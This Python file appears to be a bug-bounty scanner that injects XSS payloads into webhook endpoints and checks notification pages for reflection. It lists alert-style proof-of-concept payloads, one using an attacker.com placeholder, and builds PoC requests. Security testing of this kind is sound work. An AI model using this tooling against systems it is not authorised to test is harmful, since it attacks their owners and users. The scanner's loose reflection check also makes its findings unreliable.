"""Webhook XSS scanner — callback injection and delivery tracing."""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from urllib.parse import urljoin

import httpx

try:
    from bs4 import BeautifulSoup
except ImportError:  # pragma: no cover
    BeautifulSoup = None


# Payloads for webhook notification bodies
WEBHOOK_PAYLOADS = [
    '<img src=x onerror=alert(document.domain)>',
    '<svg onload=alert(document.domain)>',
    '<script>alert(document.domain)</script>',
    '"><img src=x onerror=alert(document.domain)>',
    "javascript:alert(document.domain)",
    '<iframe src="javascript:alert(document.domain)">',
    # JSON-embedded
    '{"text": "<img src=x onerror=alert(document.domain)>"}',
    # URL-based callback XSS via referrer logging
    'https://attacker.com/"><img src=x onerror=alert(document.domain)>',
    # Email subject injection
    "=?UTF-8?Q?<img_src=x_onerror=alert(document.domain)>?=",
]

# Path/endpoint hints for webhook configuration
WEBHOOK_PATH_HINTS = [
    "/webhook", "/webhooks", "/integrations", "/notifications",
    "/api/webhook", "/api/webhooks", "/api/integrations",
    "/settings/webhooks", "/settings/integrations", "/settings/notifications",
    "/slack", "/teams", "/discord", "/zapier",
]

# Notification delivery path hints (where webhook output may render)
NOTIFICATION_PATH_HINTS = [
    "/notifications", "/inbox", "/alerts", "/activity",
    "/admin/notifications", "/dashboard/notifications",
]

# Webhook service signatures in HTML/JS
WEBHOOK_SERVICE_SIGNATURES: list[tuple[str, str]] = [
    (r"slack\.com|slack_webhook|slackbot", "slack"),
    (r"teams\.microsoft\.com|ms_teams_webhook", "microsoft-teams"),
    (r"discord\.com/api/webhooks", "discord"),
    (r"zapier\.com|hooks\.zapier", "zapier"),
    (r"hooks\.slack|incoming-webhook", "slack"),
    (r"sendgrid|twilio|mailgun|ses\.amazonaws", "email-service"),
]


@dataclass
class WebhookEndpoint:
    """A detected or inferred webhook endpoint."""
    url: str
    method: str  # POST
    payload_format: str  # json | form | url
    service: str  # slack | teams | discord | generic
    fields: dict[str, str] = field(default_factory=dict)  # Known body fields
    notification_url: str = ""  # Where output may render


@dataclass
class DeliveryTrace:
    """Result of checking if webhook payload reached a notification view."""
    delivered: bool
    notification_url: str
    evidence: str
    executed: bool


@dataclass
class WebhookFinding:
    type: str = "webhook"
    inject_url: str = ""
    notification_url: str = ""
    service: str = ""
    payload: str = ""
    field: str = ""
    poc: str = ""
    severity: str = "P2"
    evidence: str = ""
    note: str = ""  # e.g., "Third-party delivery — verify in-scope notification view"


class WebhookXSS:
    """Tests XSS via webhook payload injection and notification delivery tracing."""

    def __init__(self, base_url: str, session: httpx.Client | None = None):
        self.base_url = base_url.rstrip("/")
        self.session = session or httpx.Client(
            timeout=30,
            follow_redirects=True,
            headers={"User-Agent": "XSSHunter/2.0"},
        )

    def scan(self, endpoints: list[WebhookEndpoint] | None = None) -> list[WebhookFinding]:
        """Inject payloads into webhook endpoints and trace notification delivery."""
        if endpoints is None:
            endpoints = self.discover_endpoints()

        findings: list[WebhookFinding] = []
        for endpoint in endpoints:
            for payload in WEBHOOK_PAYLOADS[:6]:
                inject_ok = self._inject(endpoint, payload)
                if not inject_ok:
                    continue
                trace = self._trace_delivery(endpoint, payload)
                severity = "P1" if trace.executed else "P2"
                note = "" if trace.delivered else "Webhook may deliver to third-party — verify in-scope notification view"
                findings.append(WebhookFinding(
                    inject_url=endpoint.url,
                    notification_url=trace.notification_url or endpoint.notification_url,
                    service=endpoint.service,
                    payload=payload,
                    field=list(endpoint.fields.keys())[0] if endpoint.fields else "body",
                    poc=self._build_poc(endpoint, payload),
                    severity=severity,
                    evidence=trace.evidence,
                    note=note,
                ))
        return self._dedupe(findings)

    def discover_endpoints(self) -> list[WebhookEndpoint]:
        """Find webhook endpoints by crawling the base URL."""
        endpoints: list[WebhookEndpoint] = []
        try:
            resp = self.session.get(self.base_url)
            resp.raise_for_status()
        except Exception:
            return endpoints

        service = self._detect_service(resp.text)
        for path in WEBHOOK_PATH_HINTS:
            url = urljoin(self.base_url, path)
            try:
                probe = self.session.get(url)
                if probe.status_code not in (404, 410):
                    notification_url = self._infer_notification_url()
                    endpoints.append(WebhookEndpoint(
                        url=url,
                        method="POST",
                        payload_format="json",
                        service=service,
                        fields={"text": "string", "message": "string"},
                        notification_url=notification_url,
                    ))
            except Exception:
                continue
        return endpoints[:5]

    def _inject(self, endpoint: WebhookEndpoint, payload: str) -> bool:
        """POST payload to webhook endpoint."""
        body_field = next(iter(endpoint.fields), "text")
        if endpoint.payload_format == "json":
            data = json.dumps({body_field: payload})
            headers = {"Content-Type": "application/json"}
            try:
                resp = self.session.post(endpoint.url, content=data, headers=headers)
                return resp.status_code < 400
            except Exception:
                return False
        else:
            try:
                resp = self.session.post(endpoint.url, data={body_field: payload})
                return resp.status_code < 400
            except Exception:
                return False

    def _trace_delivery(self, endpoint: WebhookEndpoint, payload: str) -> DeliveryTrace:
        """Check notification views for payload presence."""
        notification_url = endpoint.notification_url or self._infer_notification_url()
        try:
            resp = self.session.get(notification_url)
            resp.raise_for_status()
        except Exception:
            return DeliveryTrace(delivered=False, notification_url=notification_url, evidence="", executed=False)

        found = payload in resp.text or any(
            token in resp.text.lower() for token in ["onerror=", "onload=", "alert("]
        )
        executed = found and any(
            token in payload.lower() for token in ("onerror", "onload", "javascript:")
        )
        evidence = self._snippet(resp.text, payload) if found else ""
        return DeliveryTrace(delivered=found, notification_url=notification_url, evidence=evidence, executed=executed)

    def _detect_service(self, html_text: str) -> str:
        for pattern, service in WEBHOOK_SERVICE_SIGNATURES:
            if re.search(pattern, html_text, re.IGNORECASE):
                return service
        return "generic"

    def _infer_notification_url(self) -> str:
        return urljoin(self.base_url, NOTIFICATION_PATH_HINTS[0])

    def _build_poc(self, endpoint: WebhookEndpoint, payload: str) -> str:
        field = next(iter(endpoint.fields), "text")
        body = json.dumps({field: payload})
        return f"POST {endpoint.url}\nContent-Type: application/json\n\n{body}"

    def _snippet(self, text: str, value: str, radius: int = 80) -> str:
        idx = text.find(value)
        if idx < 0:
            return text[:radius * 2].replace("\n", "\\n")
        return text[max(0, idx - radius): idx + len(value) + radius].replace("\n", "\\n")

    def _dedupe(self, findings: list[WebhookFinding]) -> list[WebhookFinding]:
        seen: set[tuple[str, str]] = set()
        out = []
        for f in findings:
            key = (f.inject_url, f.payload)
            if key not in seen:
                seen.add(key)
                out.append(f)
        return out
